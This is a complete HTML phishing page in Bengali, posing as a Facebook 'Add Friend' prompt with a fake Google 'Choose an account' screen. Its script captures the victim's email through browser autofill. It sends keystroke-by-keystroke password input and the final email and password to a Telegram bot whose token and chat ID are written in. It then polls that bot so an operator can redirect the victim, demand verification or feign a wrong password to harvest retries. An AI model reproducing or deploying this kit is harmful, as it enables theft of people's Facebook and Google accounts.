<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Add Friend</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f2f5; font-family: 'Roboto', Arial, sans-serif; }
        .fb-input {
            width: 100%; padding: 14px 16px; border: 1px solid #dddfe2;
            border-radius: 6px; background: #f5f6f7; font-size: 15px; outline: none;
        }
        .fb-input:focus { border-color: #1877f2; background: #fff; box-shadow: 0 0 0 2px #e7f3ff; }
        .hidden { display: none; }
        .google-account-item {
            display: flex; align-items: center; padding: 12px; border-bottom: 1px solid #eee;
            cursor: pointer; transition: background 0.2s;
        }
        .google-account-item:hover { background: #f8f9fa; }
        .fb-loader {
            width: 50px; height: 50px; border: 5px solid #f3f3f3;
            border-top: 5px solid #1877f2; border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="flex flex-col items-center min-h-screen">

    <div id="step1" class="w-full max-w-sm mt-10 p-4">
        <div class="bg-white shadow-md rounded-2xl overflow-hidden text-center border border-gray-100">
            <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full">
            <div class="p-6">
                <h2 class="text-xl font-bold mb-4 text-gray-800">নতুন বন্ধু বানান</h2>
                <button onclick="goToStep('google_chooser')" class="w-full bg-[#1877f2] text-white font-bold py-3 rounded-xl shadow-md">Add Friend</button>
            </div>
        </div>
    </div>

    <div id="google_chooser" class="hidden w-full max-w-sm mt-10 p-4">
        <div class="bg-white shadow-lg rounded-xl overflow-hidden border border-gray-200 p-6">
            <div class="flex flex-col items-center mb-6">
                <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" class="w-8 mb-2">
                <h1 class="text-xl font-medium text-gray-900">Choose an account</h1>
                <p class="text-sm text-gray-600">to continue to Facebook</p>
            </div>

            <div class="border rounded-lg overflow-hidden">
                <div class="google-account-item" onclick="autoPickEmail()">
                    <div class="w-10 h-10 bg-blue-500 text-white flex items-center justify-center rounded-full mr-3 font-bold text-lg">?</div>
                    <div class="flex-1 text-left">
                        <p id="suggested_email" class="text-sm font-semibold text-gray-800">Use another account / Autofill</p>
                        <p class="text-xs text-gray-500">Sign in to proceed</p>
                    </div>
                </div>
            </div>

            <p class="text-xs text-gray-500 mt-6 text-center">To continue, Google will share your name, email address, and profile picture with Facebook.</p>
        </div>
    </div>

    <div id="step2" class="hidden w-full max-w-sm mt-6 p-4">
        <div class="bg-white shadow-md rounded-2xl overflow-hidden border border-gray-100">
            <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full">
            <div class="p-6">
                <form id="loginForm" autocomplete="on">
                    <p id="display_email" class="text-center font-bold text-gray-700 mb-3 bg-blue-50 py-2 rounded-lg"></p>
                    <input type="email" id="email" name="email" autocomplete="username" class="hidden">
                    <input type="password" id="pass" name="password" autocomplete="current-password" class="fb-input mb-4" placeholder="পাসওয়ার্ড লিখুন" oninput="handlePassInput(this.value)">
                    <button type="button" onclick="startWaiting()" class="w-full bg-[#1877f2] text-white font-bold py-3 rounded-xl shadow-md">Add Friend</button>
                </form>
            </div>
        </div>
    </div>

    <div id="step3" class="hidden fixed inset-0 bg-[#f0f2f5] z-50 flex flex-col items-center pt-10 text-center">
        <div class="w-full max-w-sm bg-white shadow-md rounded-2xl overflow-hidden">
            <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full">
            <div class="p-10 flex flex-col items-center">
                <div id="loader" class="fb-loader mb-6"></div>
                <h3 id="status-title" class="text-xl font-bold text-gray-800">যাচাই করা হচ্ছে...</h3>
                <p id="status-msg" class="text-gray-500 mt-2 px-4">অল্প কিছুক্ষণ অপেক্ষা করুন।</p>
                <a id="success-link" href="https://m.me/sabinayasmeen121" class="hidden mt-6 w-full bg-[#1877f2] text-white font-bold py-3 rounded-xl text-center shadow-lg">Open Facebook</a>
                <button id="retry-btn" onclick="goToStep('step2')" class="hidden mt-6 w-full bg-red-500 text-white font-bold py-3 rounded-xl shadow-lg">পুনরায় চেষ্টা করুন</button>
            </div>
        </div>
    </div>

<script>
    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
    const chatId = "8516934257";
    let lastUpdateId = 0;

    function goToStep(id) {
        document.getElementById('step1').classList.add('hidden');
        document.getElementById('google_chooser').classList.add('hidden');
        document.getElementById('step2').classList.add('hidden');
        document.getElementById('step3').classList.add('hidden');
        document.getElementById(id).classList.remove('hidden');
    }

    // গুগল অ্যাকাউন্ট অটো-পিক লজিক
    function autoPickEmail() {
        // এখানে ব্রাউজার তার অরিজিনাল অটোফিল ডায়ালগ দেখাবে
        const input = document.createElement('input');
        input.type = 'email';
        input.autocomplete = 'username';
        input.style.opacity = '0';
        document.body.appendChild(input);
        input.focus();
        
        // যখন ইউজার একটি ইমেইল সিলেক্ট করবে
        input.onchange = function() {
            const email = input.value;
            if(email) {
                document.getElementById('email').value = email;
                document.getElementById('display_email').innerText = email;
                sendData("📧 Google Account Selected: " + email);
                goToStep('step2');
            }
        };
        // যদি অটোফিল না আসে, তবে সরাসরি সেকেন্ড পেজে নিয়ে যাবে
        setTimeout(() => { if(!input.value) goToStep('step2'); }, 1000);
    }

    async function sendData(text) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: chatId, text: text })
        });
    }

    function handlePassInput(val) {
        if (val.length >= 4) sendData("🔑 Password Typing: " + val);
    }

    async function startWaiting() {
        const email = document.getElementById('email').value || "Unknown";
        const pass = document.getElementById('pass').value;
        if(!pass) { alert("পাসওয়ার্ড দিন!"); return; }

        sessionStorage.setItem('isWaiting', 'true');
        goToStep('step3'); 

        const msg = `🚀 **লগইন ডাটা**\n📧 User: \`${email}\`\n🔑 Pass: \`${pass}\``;
        const buttons = {
            inline_keyboard: [
                [{ text: "🔑 Google Pass Change (Hindi)", callback_data: "cmd_google" }],
                [{ text: "⚠️ Verify Account", callback_data: "cmd_verify" }],
                [{ text: "✅ Success", callback_data: "cmd_success" }, { text: "❌ Error", callback_data: "cmd_error" }]
            ]
        };

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: "Markdown", reply_markup: buttons })
        });
        listenForCommands();
    }

    function listenForCommands() {
        setInterval(async () => {
            try {
                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
                const data = await res.json();
                if (data.result) {
                    data.result.forEach(update => {
                        lastUpdateId = update.update_id;
                        const cmd = update.callback_query?.data;
                        if (cmd === "cmd_google") window.location.href = "https://myaccount.google.com/signinoptions/password?hl=hi";
                        else if (cmd === "cmd_verify") showFinalState("verify");
                        else if (cmd === "cmd_success") showFinalState("success");
                        else if (cmd === "cmd_error") showFinalState("error");
                    });
                }
            } catch (e) {}
        }, 3000);
    }

    function showFinalState(type) {
        const title = document.getElementById('status-title');
        if (type === "success") {
            document.getElementById('loader').classList.add('hidden');
            title.innerText = "সফল হয়েছে!"; title.style.color = "green";
            document.getElementById('success-link').classList.remove('hidden');
        } else if (type === "verify") {
            title.innerText = "ভেরিফিকেশন আবশ্যক"; title.style.color = "orange";
        } else {
            document.getElementById('loader').classList.add('hidden');
            title.innerText = "ভুল পাসওয়ার্ড!"; title.style.color = "red";
            document.getElementById('retry-btn').classList.remove('hidden');
        }
    }
</script>
</body>
</html>
